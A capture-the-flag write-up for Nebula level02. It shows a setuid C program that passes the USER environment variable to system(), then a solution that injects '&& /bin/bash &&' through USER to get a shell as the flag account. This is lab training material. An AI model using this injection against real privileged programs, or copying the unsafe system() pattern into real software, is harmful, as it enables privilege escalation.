# Level02

## Task

>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

## Solution

The binary calls the `USER` enviroment variable. Changing this allows us to exploit and get the flag.

```
level02@nebula:/home/flag02$ export USER="user && /bin/bash && echo"
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo user && /bin/bash && echo is cool")
user
```

```
flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```
